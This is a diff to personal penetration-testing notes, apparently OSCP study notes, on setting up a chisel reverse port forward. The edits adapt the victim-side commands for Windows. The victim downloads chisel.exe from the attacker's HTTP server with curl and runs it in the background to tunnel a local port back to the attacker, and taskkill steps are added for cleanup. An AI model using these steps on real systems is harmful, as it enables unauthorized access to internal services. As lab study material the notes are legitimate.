@@ -1,3 +1,7 @@
+KILL CHISEL.EXE
+```
+taskkill /F /IM chisel.exe
+```
 # Basic Reverse Port Forward
 
 ### Scenario
@@ -54,7 +58,7 @@ Upload to target (webshell / smb / etc).
 
 On KALI ATTACKER
 ```
-python3 -m http.server 80
+cd ~/Desktop/Tools/chisel && python3 -m http.server 80
 ```
 
 On VICTIM HOST (Linuxx86)
@@ -69,7 +73,7 @@ On VICTIM HOST (Windows)
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `cd /tmp && wget http://${KaliIP}:80/chisel_1.10.1_windows_amd64 -O chisel && chmod +x chisel`;
+const command = `curl http://${KaliIP}:80/Windows_AMD64_Chisel -o chisel.exe`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -80,7 +84,7 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `cd /tmp && ./chisel client ${KaliIP}:9999 R:8888:127.0.0.1:8888`;
+const command = `start /b chisel.exe client ${KaliIP}:9999 R:[PORT]:127.0.0.1:[PORT]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
@@ -93,6 +97,24 @@ Explanation:
 | `R:`               | back to the attacker on port 8888 |
 | `8888`             | Port opened on attacker           |
 | `127.0.0.1:8888`   | Target local service              |
+
+If need to kill
+
+```
+tasklist | findstr chisel
+```
+
+![[Pasted image 20260913121128.png]]
+
+```
+taskkill /F /PID 3500
+```
+
+Or kill all chisel.exe at once
+
+```
+taskkill /F /IM chisel.exe
+```
 
 ---
 
